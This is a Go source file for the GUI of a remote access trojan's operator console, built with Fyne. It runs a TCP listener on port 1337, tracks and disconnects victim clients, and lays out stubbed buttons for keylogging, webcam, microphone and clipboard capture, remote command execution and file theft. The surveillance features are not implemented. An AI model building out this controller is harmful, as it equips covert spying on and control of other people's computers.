package rhandler

import (
	"fmt"
	"guiv1/misc"
	"strconv"
	"time"

	"guiv1/handlers/rathandler"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/cmd/fyne_settings/settings"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

var (
	f_   = misc.Funcs{}
	icns = misc.IconUtil{}
)

var (
	ServerAddress      = "0.0.0.0:1337"
	ClientActionOption = ""
	TcpServer          = rathandler.NewTCPServer()
)

func ClientActionWindow(w fyne.Window, app fyne.App, title string, callback func(), icon fyne.Resource) {

	ModalContainer := container.NewVBox()
	ModalContainer.Layout = layout.NewVBoxLayout()
	if len(rathandler.Clients) > 0 {
		modal := app.NewWindow(title)
		modal.SetIcon(icon)

		ModalContainer.Add(widget.NewSelect(rathandler.StringClients, func(option string) {
			ClientActionOption = option
		}))
		ModalContainer.Add(
			widget.NewButton("Confirm", func() {
				callback()
				ClientActionOption = ""
				modal.Hide()
			}),
		)
		modal.Resize(fyne.NewSize(400, 200))
		modal.SetFixedSize(true)
		modal.SetContent(ModalContainer)
		modal.Show()
	}
}

func NewRatHandler(w fyne.Window, app fyne.App) *fyne.Container {
	TcpServer.Addr = ServerAddress
	w.Resize(fyne.NewSize(1000, 800))
	w.CenterOnScreen()

	ToolBar_ExitBtn := widget.NewToolbarAction(icns.Icons8("256", "emergency-exit.png", "fluency"), func() {
		// Close the window
		w.Close()
	})
	ToolBar_MainSettingsBtn := widget.NewToolbarAction(icns.Icons8("256", "services.png", "fluency"), func() {
		// Open settings window
		AppMainSettingsWindow := app.NewWindow("S7 Gui Settings")
		AppMainSettingsWindow.SetIcon(icns.Icon("appicon"))
		AppMainSettingsWindow.SetContent(settings.NewSettings().LoadAppearanceScreen(w))
		AppMainSettingsWindow.Resize(fyne.NewSize(440, 520))
		AppMainSettingsWindow.Show()

	})
	ToolBar_StubBuildBtn := widget.NewToolbarAction(icns.Icons8("256", "hammer-and-anvil.png", "fluency"), func() {

	})
	ToolBar_RefreshConnection := widget.NewToolbarAction(icns.Icons8("256", "recurring-appointment.png", "fluency"), func() {

	})
	ToolBar_RunRatServerBtn := widget.NewToolbarAction(icns.Icons8("256", "play--v1.png", "fluency"), func() {

	})
	ToolBar_StopRatServerBtn := widget.NewToolbarAction(icns.Icons8("256", "stop--v1.png", "fluency"), func() {

	})
	ToolBar := widget.NewToolbar(
		ToolBar_ExitBtn,
		widget.NewToolbarSeparator(),
		ToolBar_MainSettingsBtn,
		ToolBar_StubBuildBtn,
		ToolBar_RefreshConnection,
		widget.NewToolbarSpacer(),
		ToolBar_RunRatServerBtn,
		ToolBar_StopRatServerBtn,
	)
	NavBarLeft_CloseConnectionBtn := widget.NewButton("Close Connection", func() {
		ClientActionWindow(w, app, "Close Connection", func() {
			for i, client := range rathandler.Clients {
				if ClientActionOption == client.RemoteAddr().String() {
					client.Close()
					// remove client from the list of connected clients
					rathandler.Clients = append(rathandler.Clients[:i], rathandler.Clients[i+1:]...)
					rathandler.StringClients = append(rathandler.StringClients[:i], rathandler.StringClients[i+1:]...)
				}
			}

		}, icns.Icons8("256", "disconnected--v1.png", "fluency"))

	})
	NavBarLeft_CloseAllConnectionsBtn := widget.NewButton("Close All Connections", func() {
		// Handle Option 7 click
		// Add logic to close all client connections
		if len(rathandler.Clients) > 0 {
			rathandler.Tasks = append(rathandler.Tasks, "kill")
			f_.NotificationModal(w, &misc.ChatApp{}, "Success", "All client connections have been closed.")
		} else {
			f_.NotificationModal(w, &misc.ChatApp{}, "Error", "No clients connected to close.")
		}
	})
	NavBarLeft_CurrentDirectoryBtn := widget.NewButton("Current Directory", func() {
		// Handle Option 2 click
		// Add logic to display the current directory
	})
	NavBarLeft_ListDirectoryBtn := widget.NewButton("List Directory", func() {
		// Handle Option 3 click
		// Add logic to list the contents of the current directory
	})
	NavBarLeft_UploadFileBtn := widget.NewButton("Upload File", func() {
		// Handle Option 4 click
		// Add logic to upload a file to the server
	})
	NavBarLeft_DownloadFileBtn := widget.NewButton("Download File", func() {
		// Handle Option 5 click
		// Add logic to download a file from the server
	})
	NavBarLeft_DeleteFileBtn := widget.NewButton("Delete File", func() {
		// Handle Option 6 click
		// Add logic to delete a file from the server
	})
	NavBarLeft_ExecuteCommandBtn := widget.NewButton("Execute Command", func() {
		// Handle Option 7 click
		// Add logic to execute a command on the server
	})
	NavBarLeft_KeyLoggerBtn := widget.NewButton("Key Logger", func() {
		// Handle Option 8 click
		// Add logic to start/stop the key logger
	})
	NavBarLeft_ScreenshotBtn := widget.NewButton("Screenshot", func() {
		// Handle Option 9 click
		// Add logic to capture a screenshot of the server
	})
	NavBarLeft_WebCamCaptureBtn := widget.NewButton("WebCam Capture", func() {
		// Handle Option 10 click
		// Add logic to capture video from the server's webcam
	})
	NavBarLeft_MicrophoneCaptureBtn := widget.NewButton("Microphone Capture", func() {
		// Handle Option 11 click
		// Add logic to capture audio from the server's microphone
	})
	NavBarLeft_ClipBoardCaptureBtn := widget.NewButton("Clipboard", func() {
		// Handle Option 12 click
		// Add logic to capture and manage the clipboard on the server
	})
	NavBarLeft_SystemInformationBtn := widget.NewButton("System Information", func() {
		// Handle Option 13 click
		// Add logic to display system information of the server
	})
	NavBarLeft_NetworkInformationBtn := widget.NewButton("Network Information", func() {
		// Handle Option 14 click
		// Add logic to display network information of the server
	})
	NavBarLeft_ShutdownSystemBtn := widget.NewButton("Shutdown System", func() {
		// Handle Option 15 click
		// Add logic to shut down the client's machine
	})
	NavBarLeft_CloseConnectionBtn.SetIcon(icns.Icons8("256", "disconnected--v1.png", "fluency"))
	NavBarLeft_CloseAllConnectionsBtn.SetIcon(icns.Icons8("256", "delete-shield.png", "fluency"))
	NavBarLeft_CurrentDirectoryBtn.SetIcon(icns.Icons8("256", "desktop-folder.png", "fluency"))
	NavBarLeft_ListDirectoryBtn.SetIcon(icns.Icons8("256", "folder-tree.png", "fluency"))
	NavBarLeft_UploadFileBtn.SetIcon(icns.Icons8("256", "upload--v16.png", "fluency"))
	NavBarLeft_DownloadFileBtn.SetIcon(icns.Icons8("256", "download.png", "fluency"))
	NavBarLeft_DeleteFileBtn.SetIcon(icns.Icons8("256", "delete-property.png", "fluency"))
	NavBarLeft_ExecuteCommandBtn.SetIcon(icns.Icons8("256", "command-line.png", "fluency"))
	NavBarLeft_KeyLoggerBtn.SetIcon(icns.Icons8("256", "grand-master-key.png", "fluency"))
	NavBarLeft_ScreenshotBtn.SetIcon(icns.Icons8("256", "take-screenshot.png", "fluency"))
	NavBarLeft_WebCamCaptureBtn.SetIcon(icns.Icons8("256", "webcam.png", "fluency"))
	NavBarLeft_MicrophoneCaptureBtn.SetIcon(icns.Icons8("256", "microphone.png", "fluency"))
	NavBarLeft_ClipBoardCaptureBtn.SetIcon(icns.Icons8("256", "add-to-clipboard.png", "fluency"))
	NavBarLeft_SystemInformationBtn.SetIcon(icns.Icons8("256", "system-information.png", "fluency"))
	NavBarLeft_NetworkInformationBtn.SetIcon(icns.Icons8("256", "wired-network-connection.png", "fluency"))
	NavBarLeft_ShutdownSystemBtn.SetIcon(icns.Icons8("256", "shutdown.png", "fluency"))
	NavBarLeft := container.NewVBox(
		widget.NewLabelWithStyle("Command Options", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		widget.NewSeparator(),
		NavBarLeft_CloseConnectionBtn,
		NavBarLeft_CloseAllConnectionsBtn,
		NavBarLeft_CurrentDirectoryBtn,
		NavBarLeft_ListDirectoryBtn,
		NavBarLeft_UploadFileBtn,
		NavBarLeft_DownloadFileBtn,
		NavBarLeft_DeleteFileBtn,
		NavBarLeft_ExecuteCommandBtn,
		NavBarLeft_KeyLoggerBtn,
		NavBarLeft_ScreenshotBtn,
		NavBarLeft_WebCamCaptureBtn,
		NavBarLeft_MicrophoneCaptureBtn,
		NavBarLeft_ClipBoardCaptureBtn,
		NavBarLeft_SystemInformationBtn,
		NavBarLeft_NetworkInformationBtn,
		NavBarLeft_ShutdownSystemBtn,
	)
	BottomStatusText := widget.NewLabelWithStyle("Connection Status: Disconnected", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	BottomServerAddressText := widget.NewLabelWithStyle("Server Address: N/A", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	BottomServerStatusText := widget.NewLabelWithStyle("Server Status: Offline", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	go func() {
		for {
			BottomStatusText.SetText("Connected Clients: " + strconv.Itoa(len(rathandler.Clients)))
			time.Sleep(2 * time.Second)
		}
	}()
	ToolBar_RefreshConnection.OnActivated = func() {
		// Refresh connection status
		BottomStatusText.SetText("Connected Clients: " + strconv.Itoa(len(rathandler.Clients)))
	}
	ServerInfoContainer := container.NewGridWithColumns(
		2,
		BottomServerAddressText,
		BottomServerStatusText,
	)
	ClientInfoContainer := container.NewGridWithColumns(
		1,
		BottomStatusText,
	)
	ServerInfoContainer.Layout = layout.NewGridLayoutWithColumns(2)
	ClientInfoContainer.Layout = layout.NewGridLayoutWithColumns(3)
	BottomInfoContainer := container.NewVBox(
		widget.NewSeparator(),
		container.NewHBox(
			ServerInfoContainer,
			layout.NewSpacer(),
			ClientInfoContainer,
		),
	)
	BottomInfoContainer.Layout = layout.NewVBoxLayout()

	ToolBar_RunRatServerBtn.OnActivated = func() {
		// Handle the "Run RAT Server" button click
		// Add logic to start the RAT server
		TcpServer.Start()
		BottomServerStatusText.SetText("Server Status: Online")
		BottomServerAddressText.SetText(fmt.Sprintf("Server Address: %s", ServerAddress))
		BottomInfoContainer.Refresh()

	}
	ToolBar_StopRatServerBtn.OnActivated = func() {
		// Handle the "Stop RAT Server" button click
		// Add logic to stop the RAT server
		TcpServer.Stop()
		BottomServerStatusText.SetText("Server Status: Offline")
		BottomServerAddressText.SetText("Server Address: N/A")
		BottomInfoContainer.Refresh()

	}
	ToolBarContainer := container.NewVBox(
		ToolBar,
		widget.NewSeparator(),
	)
	ToolBarContainer.Refresh()
	ToolBar.Refresh()
	BorderContainer := container.NewBorder(
		ToolBarContainer,
		BottomInfoContainer,
		NavBarLeft,
		nil,
		nil,
	)

	return BorderContainer
}
